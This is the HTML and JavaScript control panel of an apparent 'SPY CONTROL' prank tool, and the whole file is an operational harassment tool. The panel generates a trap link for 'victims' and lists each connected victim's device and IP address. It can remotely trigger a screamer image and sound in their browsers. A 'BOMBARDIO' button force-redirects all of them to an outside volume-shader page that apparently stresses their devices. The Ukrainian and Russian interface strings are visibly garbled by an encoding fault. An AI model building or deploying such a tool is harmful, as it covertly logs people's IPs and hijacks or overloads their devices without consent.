<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SPY CONTROL v6.2</title>
    <style>
        :root {
            --neon: #00ffcc;
            --neon-secondary: #00aaff;
            --danger: #ff3366;
            --bg-dark: #050507;
            --card-bg: rgba(20, 20, 25, 0.95);
            --text-color: #e0e0e0;
            --disabled: #333;
        }
        body { 
            background-color: var(--bg-dark); color: var(--text-color); 
            font-family: 'Segoe UI', Roboto, sans-serif; 
            margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center;
            background: radial-gradient(ellipse at bottom, #1B2735 0%, #090A0F 100%);
            overflow: hidden;
        }

        .container { 
            position: relative; z-index: 1; width: 95%; max-width: 500px; 
            background: var(--card-bg); padding: 20px; border-radius: 20px; 
            border: 1px solid rgba(0, 255, 204, 0.15);
            backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
            box-sizing: border-box;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            max-height: 95vh; 
            overflow-y: auto;
        }
        
        /* Lang Bar */
        .lang-bar { display: flex; justify-content: center; gap: 8px; margin-bottom: 15px; }
        .lang-btn { 
            background: rgba(255,255,255,0.05); border: 1px solid #333; color: #888; 
            padding: 5px 10px; border-radius: 8px; cursor: pointer; font-size: 11px;
        }
        .lang-btn.active { border-color: var(--neon); color: var(--bg-dark); background: var(--neon); }

        h1 { font-size: 20px; text-transform: uppercase; text-align: center; color: var(--neon); letter-spacing: 2px; margin-bottom: 15px; }

        .mode-switch {
            display: flex; gap: 10px; margin-bottom: 15px; background: #000; padding: 5px; border-radius: 10px;
        }
        .mode-btn {
            flex: 1; border: none; background: transparent; color: #555; padding: 8px; border-radius: 8px; cursor: pointer; font-size: 11px; font-weight: bold; transition: 0.3s;
        }
        .mode-btn.active { background: #222; color: var(--neon); box-shadow: 0 0 10px rgba(0,255,204,0.1); }

        .input-box { background: rgba(0,0,0,0.3); padding: 12px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #222; position: relative; }
        
        input[type="text"] { 
            width: 100%; padding: 10px; background: #000; border: 1px solid #333; 
            color: white; border-radius: 8px; box-sizing: border-box; font-size: 12px; margin-top: 5px; margin-bottom: 5px;
        }

        input[type="file"] { display: none; }
        .file-label {
            display: block; width: 100%; padding: 10px; text-align: center; box-sizing: border-box;
            background: #111; border: 1px dashed #444; border-radius: 8px; color: #888; cursor: pointer; font-size: 11px; margin-top: 5px;
        }
        .file-label:hover { border-color: var(--neon); color: var(--neon); }
        .file-selected { border-color: var(--neon-secondary); color: var(--neon-secondary); background: rgba(0,170,255,0.1); }

        .input-wrapper { display: flex; gap: 5px; align-items: center; position: relative; width: 100%; }

        .sound-menu-btn {
            background: #222; border: 1px solid var(--neon-secondary); color: var(--neon-secondary);
            border-radius: 8px; width: 40px; height: 38px; flex-shrink: 0; display: flex;
            justify-content: center; align-items: center; cursor: pointer; font-size: 18px;
        }
        .sound-dropdown {
            display: none; position: absolute; top: 45px; right: 0; width: 100%;
            background: #151515; border: 1px solid var(--neon-secondary); border-radius: 10px;
            z-index: 999; max-height: 200px; overflow-y: auto; box-shadow: 0 5px 20px rgba(0,0,0,0.8);
        }
        .sound-dropdown.show { display: block; }
        
        .sound-item {
            padding: 8px 10px; border-bottom: 1px solid #222; font-size: 11px; cursor: pointer;
            color: #ccc; display: flex; justify-content: space-between; align-items: center;
        }
        .sound-item:hover { background: var(--neon-secondary); color: #000; }
        
        .preview-btn {
            font-size: 10px; padding: 2px 5px; border: 1px solid #555; border-radius: 4px; 
            background: black; color: white; margin-left: 10px; cursor: pointer;
        }

        button.main-btn { 
            width: 100%; padding: 12px; border: none; border-radius: 10px; font-weight: bold;
            cursor: pointer; text-transform: uppercase; margin-top: 8px; transition: 0.3s; font-size: 13px;
        }
        .btn-create { background: var(--neon); color: black; }
        .btn-update { background: #222; color: var(--neon); border: 1px solid var(--neon); }
        
        .btn-scare { 
            background: var(--disabled); color: #555; height: 60px; font-size: 18px; 
            cursor: not-allowed; opacity: 0.6; margin-top: 15px;
        }
        .btn-scare.ready { 
            background: var(--danger); color: white; cursor: pointer; opacity: 1;
            animation: pulse 2s infinite; 
        }

        .btn-bomb {
            background: repeating-linear-gradient(45deg, #000, #000 10px, #330000 10px, #330000 20px);
            color: var(--danger); border: 2px solid var(--danger);
            margin-top: 10px; height: 45px; letter-spacing: 1px;
            cursor: not-allowed; opacity: 0.5;
        }
        .btn-bomb.ready { cursor: pointer; opacity: 1; }
        
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.03); } 100% { transform: scale(1); } }

        .link-box { background: #000; padding: 10px; border-radius: 8px; border: 1px dashed #444; margin: 10px 0; word-break: break-all; font-size: 11px; text-align: center;}
        
        .history-item { 
            display: flex; justify-content: space-between; align-items: center;
            background: #111; padding: 8px; border-radius: 8px; margin-bottom: 5px; cursor: pointer; font-size: 11px;
        }
        .del-btn { color: var(--danger); background: rgba(255,0,0,0.1); border: 1px solid rgba(255,0,0,0.2); padding: 2px 8px; border-radius: 5px; cursor: pointer;}

        .hidden { display: none !important; }
        .lbl-title { font-size: 10px; font-weight: bold; color: var(--neon-secondary); display: block; margin-bottom: 4px; }
        
        /* –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è */
        .loading { opacity: 0.5; pointer-events: none; position: relative; }
        .loading::after { content: "‚ö°"; position: absolute; right: 10px; animation: pulse 0.5s infinite; }
    </style>
</head>
<body>
    <div class="container">
        <div class="lang-bar">
            <button class="lang-btn active" onclick="setLang('uk')">UA</button>
            <button class="lang-btn" onclick="setLang('ru')">RU</button>
            <button class="lang-btn" onclick="setLang('en')">EN</button>
        </div>

        <h1 id="txt-title">üëÅÔ∏è SPY CONTROL</h1>

        <div id="setup-step">
            <div class="mode-switch">
                <button class="mode-btn active" onclick="setMode('url')" id="btn-mode-url">üåê URL LINK</button>
                <button class="mode-btn" onclick="setMode('file')" id="btn-mode-file">üìÅ UPLOAD FILE</button>
            </div>

            <div class="input-box">
                <span class="lbl-title" id="lbl-img">–ó–û–ë–†–ê–ñ–ï–ù–ù–Ø / IMAGE</span>
                <input type="text" id="imgUrl" placeholder="https://site.com/image.jpg">
                <label for="imgFile" id="lbl-imgFile" class="file-label hidden">–í–∏–±—Ä–∞—Ç–∏ —Ñ–æ—Ç–æ (–º–∞–∫—Å 1)</label>
                <input type="file" id="imgFile" accept="image/*" onchange="updateFileLabel(this, 'lbl-imgFile')">
            </div>

            <div class="input-box">
                <span class="lbl-title" id="lbl-snd">–ó–í–£–ö / SOUND</span>
                <div class="input-wrapper" id="snd-url-wrapper">
                    <input type="text" id="sndUrl" value="https://soundbible.com/grab.php?id=1549&type=mp3">
                    <div class="sound-menu-btn" onclick="toggleSoundMenu('create')">‚ò∞</div>
                    <div id="sound-dropdown-create" class="sound-dropdown"></div>
                </div>
                <label for="sndFile" id="lbl-sndFile" class="file-label hidden">–í–∏–±—Ä–∞—Ç–∏ MP3 (–º–∞–∫—Å 1)</label>
                <input type="file" id="sndFile" accept="audio/*" onchange="updateFileLabel(this, 'lbl-sndFile')">
            </div>

            <button class="main-btn btn-create" onclick="handleCreate()" id="btn-create">–°–¢–í–û–†–ò–¢–ò –ü–ê–°–¢–ö–£</button>
        </div>

        <div id="control-panel" style="display:none;">
            <div class="link-box"><a id="victim-link" href="#" target="_blank" style="color: var(--neon-secondary); text-decoration: none;">Generating...</a></div>
            
            <div class="input-box" style="border-color: var(--neon);">
                <span class="lbl-title" id="lbl-upd" style="color:var(--neon)">–û–ù–û–í–ò–¢–ò –ö–û–ù–¢–ï–ù–¢ (Live)</span>
                
                <input type="text" id="updImgUrl" placeholder="Image URL">
                <label for="updImgFile" id="lbl-updImg" class="file-label" style="font-size:10px; padding:6px;">+ –ó–ê–í–ê–ù–¢–ê–ñ–ò–¢–ò –§–û–¢–û</label>
                <input type="file" id="updImgFile" accept="image/*" onchange="updateFileLabel(this, 'lbl-updImg')">

                <div class="input-wrapper" style="margin-top:8px;">
                    <input type="text" id="updSndUrl" placeholder="Sound URL">
                    <div class="sound-menu-btn" onclick="toggleSoundMenu('update')">‚ò∞</div>
                    <div id="sound-dropdown-update" class="sound-dropdown"></div>
                </div>
                <label for="updSndFile" id="lbl-updSnd" class="file-label" style="font-size:10px; padding:6px;">+ –ó–ê–í–ê–ù–¢–ê–ñ–ò–¢–ò MP3</label>
                <input type="file" id="updSndFile" accept="audio/*" onchange="updateFileLabel(this, 'lbl-updSnd')">

                <button class="main-btn btn-update" onclick="handleUpdate()" id="btn-update">–û–ù–û–í–ò–¢–ò</button>
            </div>

            <div id="users-list"></div>
            <button id="scare-btn" class="main-btn btn-scare" onclick="triggerScare()" disabled>SCREAMER üíÄ</button>
            <button id="bomb-btn" class="main-btn btn-bomb" onclick="triggerBombardio()" disabled>‚ò¢Ô∏è BOMBARDIO ‚ò¢Ô∏è</button>
            <button onclick="location.reload()" style="background:transparent; color:#555; border:none; margin-top:10px; cursor:pointer; width:100%; font-size:10px;">‚¨Ö MENU</button>
        </div>

        <div id="history-panel">
            <h3 id="txt-hist" style="font-size:11px; color:#444; margin-top:15px; border-top:1px solid #222; padding-top:10px;">–Ü–°–¢–û–†–Ü–Ø</h3>
            <div id="history-list"></div>
        </div>
    </div>

    <audio id="preview-audio"></audio>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let currentSessionId = null;
        let currentMode = 'url';
        
        // –ö–ï–® DOM –ï–õ–ï–ú–ï–ù–¢–Ü–í (–¥–ª—è —à–≤–∏–¥–∫–æ—Å—Ç—ñ)
        const DOM = {
            btnCreate: document.getElementById('btn-create'),
            btnUpdate: document.getElementById('btn-update'),
            setupStep: document.getElementById('setup-step'),
            controlPanel: document.getElementById('control-panel'),
            victimLink: document.getElementById('victim-link'),
            historyPanel: document.getElementById('history-panel'),
            scareBtn: document.getElementById('scare-btn'),
            bombBtn: document.getElementById('bomb-btn'),
            usersList: document.getElementById('users-list')
        };

        const i18n = {
            uk: { title: "üëÅÔ∏è SPY CONTROL", modeUrl: "üåê –ü–û–°–ò–õ–ê–ù–ù–Ø", modeFile: "üìÅ –§–ê–ô–õ", lblImg: "–ó–û–ë–†–ê–ñ–ï–ù–ù–Ø", lblSnd: "–ó–í–£–ö", create: "–°–¢–í–û–†–ò–¢–ò –ü–ê–°–¢–ö–£", btnUpdate: "–û–ù–û–í–ò–¢–ò –ó–ê–†–ê–ó", btnScare: "–ù–ê–õ–Ø–ö–ê–¢–ò üíÄ", alertBomb: "‚ö†Ô∏è –£–í–ê–ì–ê! –¶–µ –ø–µ—Ä–µ–∫–∏–Ω–µ –≤—Å—ñ—Ö!" },
            ru: { title: "üëÅÔ∏è –®–ü–ò–û–ù –ö–û–ù–¢–†–û–õ–¨", modeUrl: "üåê –°–°–´–õ–ö–ê", modeFile: "üìÅ –§–ê–ô–õ", lblImg: "–ò–ó–û–ë–†–ê–ñ–ï–ù–ò–ï", lblSnd: "–ó–í–£–ö", create: "–°–û–ó–î–ê–¢–¨ –õ–û–í–£–®–ö–£", btnUpdate: "–û–ë–ù–û–í–ò–¢–¨", btnScare: "–ù–ê–ü–£–ì–ê–¢–¨ üíÄ", alertBomb: "‚ö†Ô∏è –í–ù–ò–ú–ê–ù–ò–ï!" },
            en: { title: "üëÅÔ∏è SPY CONTROL", modeUrl: "üåê URL LINK", modeFile: "üìÅ UPLOAD FILE", lblImg: "IMAGE", lblSnd: "SOUND", create: "CREATE TRAP", btnUpdate: "UPDATE NOW", btnScare: "SCREAMER üíÄ", alertBomb: "‚ö†Ô∏è WARNING!" }
        };

        let curLang = 'uk';

        function setLang(lang) {
            curLang = lang;
            const t = i18n[lang];
            document.getElementById('txt-title').innerText = t.title;
            document.getElementById('btn-mode-url').innerText = t.modeUrl;
            document.getElementById('btn-mode-file').innerText = t.modeFile;
            DOM.btnCreate.innerText = t.create;
            if(!DOM.scareBtn.disabled) DOM.scareBtn.innerText = t.btnScare;
        }

        const sounds = [
            { name: "–û–ø–ª–∞—Ç–∏—Ç—å", url: "https://www.myinstants.com/media/sounds/safonov-oplatit.mp3" },
            { name: "–ß—É–≥—É–Ω", url: "https://www.myinstants.com/media/sounds/chugun.mp3" },
            { name: "–ü–æ—Ä–Ω–•–∞–±", url: "https://www.myinstants.com/media/sounds/pornkhab_zv3cqBm.mp3" },
            { name: "–î–ü–°", url: "https://www.myinstants.com/media/sounds/kriakalka-dps-no-2.mp3" },
            { name: "–°—Ç–æ–Ω—ã", url: "https://www.myinstants.com/media/sounds/shkola.mp3" },
            { name: "Screamer", url: "https://www.myinstants.com/media/sounds/scream_horror1.mp3" }
        ];

        function renderSoundMenu() {
            ['create', 'update'].forEach(type => {
                const container = document.getElementById(`sound-dropdown-${type}`);
                const inputId = type === 'create' ? 'sndUrl' : 'updSndUrl';
                container.innerHTML = sounds.map(s => `
                    <div class="sound-item">
                        <span onclick="selectSound('${inputId}', '${s.url}', 'sound-dropdown-${type}')" style="flex-grow:1">${s.name}</span>
                        <button class="preview-btn" onclick="previewSound('${s.url}', event)">‚ñ∂</button>
                    </div>`).join('');
            });
        }

        function selectSound(inputId, url, menuId) {
            document.getElementById(inputId).value = url;
            document.getElementById(menuId).classList.remove('show');
        }

        function toggleSoundMenu(type) {
            const menu = document.getElementById(`sound-dropdown-${type}`);
            const isShown = menu.classList.contains('show');
            document.querySelectorAll('.sound-dropdown').forEach(m => m.classList.remove('show'));
            if(!isShown) menu.classList.add('show');
        }

        function previewSound(url, e) {
            e.stopPropagation();
            const p = document.getElementById('preview-audio');
            p.src = url; p.volume = 0.5; p.play();
        }

        function setMode(mode) {
            currentMode = mode;
            document.querySelectorAll('.mode-btn').forEach(b => b.classList.toggle('active', b.id.includes(mode)));
            const isUrl = mode === 'url';
            document.getElementById('imgUrl').classList.toggle('hidden', !isUrl);
            document.getElementById('lbl-imgFile').classList.toggle('hidden', isUrl);
            document.getElementById('snd-url-wrapper').classList.toggle('hidden', !isUrl);
            document.getElementById('lbl-sndFile').classList.toggle('hidden', isUrl);
        }

        function updateFileLabel(input, labelId) {
            const label = document.getElementById(labelId);
            if (input.files?.[0]) {
                label.innerText = "‚úì " + input.files[0].name.slice(0,15);
                label.classList.add('file-selected');
            }
        }

        // –®–í–ò–î–ö–ï –°–¢–í–û–†–ï–ù–ù–Ø
        async function handleCreate() {
            DOM.btnCreate.classList.add('loading');
            try {
                let data;
                if (currentMode === 'url') {
                    const res = await fetch('/create', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ 
                            image: document.getElementById('imgUrl').value.trim(), 
                            sound: document.getElementById('sndUrl').value.trim() 
                        })
                    });
                    data = await res.json();
                } else {
                    const fd = new FormData();
                    fd.append('images', document.getElementById('imgFile').files[0]);
                    fd.append('sounds', document.getElementById('sndFile').files[0]);
                    const res = await fetch('/create-upload', { method: 'POST', body: fd });
                    data = await res.json();
                }
                if(data.id) activateRoom(data.id);
            } catch(e) { alert("Error"); }
            DOM.btnCreate.classList.remove('loading');
        }

        // –ü–ê–†–ê–õ–ï–õ–¨–ù–ï –û–ù–û–í–õ–ï–ù–ù–Ø (Speed Optimized)
        async function handleUpdate() {
            if (!currentSessionId) return;
            DOM.btnUpdate.classList.add('loading');

            const tasks = [];
            
            // 1. –û–Ω–æ–≤–ª–µ–Ω–Ω—è URL
            const imgUrl = document.getElementById('updImgUrl').value.trim();
            const sndUrl = document.getElementById('updSndUrl').value.trim();
            if (imgUrl || sndUrl) {
                tasks.push(fetch(`/update-session/${currentSessionId}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ image: imgUrl, sound: sndUrl })
                }));
            }
            
            // 2. –û–Ω–æ–≤–ª–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ (–ø–∞—Ä–∞–ª–µ–ª—å–Ω–æ)
            const imgFile = document.getElementById('updImgFile').files[0];
            const sndFile = document.getElementById('updSndFile').files[0];

            if (imgFile) {
                const fd = new FormData(); fd.append('images', imgFile);
                tasks.push(fetch(`/session/${currentSessionId}/upload-images`, { method: 'POST', body: fd }));
            }
            if (sndFile) {
                const fd = new FormData(); fd.append('sounds', sndFile);
                tasks.push(fetch(`/session/${currentSessionId}/upload-sounds`, { method: 'POST', body: fd }));
            }

            await Promise.all(tasks); // –ß–µ–∫–∞—î–º–æ –≤—Å—ñ –∑–∞–ø–∏—Ç–∏ –æ–¥–Ω–æ—á–∞—Å–Ω–æ
            
            DOM.btnUpdate.classList.remove('loading');
            alert("Updated!");
        }

        function activateRoom(id) {
            currentSessionId = id;
            saveHistory(id);
            DOM.setupStep.style.display = 'none';
            DOM.controlPanel.style.display = 'block';
            DOM.historyPanel.style.display = 'none';
            
            const link = `${window.location.origin}/victim.html?id=${id}`;
            DOM.victimLink.href = link;
            DOM.victimLink.innerText = link;
            socket.emit('join-room-admin', id);
        }

        function triggerScare() { socket.emit('trigger-scare', currentSessionId); }

        function triggerBombardio() {
            if(confirm(i18n[curLang].alertBomb)) {
                socket.emit('trigger-redirect', {
                    roomId: currentSessionId,
                    url: "https://prank-nfc.onrender.com/volumeshader_bm.html"
                });
            }
        }

        socket.on('update-victim-list', (u) => {
            const hasUsers = u.length > 0;
            DOM.scareBtn.disabled = !hasUsers;
            DOM.bombBtn.disabled = !hasUsers;
            DOM.scareBtn.classList.toggle('ready', hasUsers);
            DOM.bombBtn.classList.toggle('ready', hasUsers);
            
            DOM.usersList.innerHTML = hasUsers ? 
                u.map(v => `<div style="color:var(--neon); font-size:11px; margin-bottom:5px;">‚óè ${v.device} [${v.ip}]</div>`).join('') :
                '<div style="color:#555; font-size:11px;">Waiting for victims...</div>';
        });

        function saveHistory(id) {
            let h = JSON.parse(localStorage.getItem('spy_h') || '[]');
            if(!h.includes(id)) { h.unshift(id); localStorage.setItem('spy_h', JSON.stringify(h.slice(0,10))); }
        }

        function loadHistory() {
            const list = document.getElementById('history-list');
            const h = JSON.parse(localStorage.getItem('spy_h') || '[]');
            list.innerHTML = h.map(id => `
                <div class="history-item">
                    <span style="flex-grow:1" onclick="activateRoom('${id}')">ID: ${id.slice(0,8)}</span>
                    <button class="del-btn" onclick="delH('${id}', event)">‚úï</button>
                </div>`).join('');
        }

        function delH(id, e) {
            e.stopPropagation();
            let h = JSON.parse(localStorage.getItem('spy_h') || '[]').filter(i => i !== id);
            localStorage.setItem('spy_h', JSON.stringify(h));
            loadHistory();
        }

        window.onload = () => { loadHistory(); renderSoundMenu(); setLang('uk'); };
    </script>
</body>
</html>
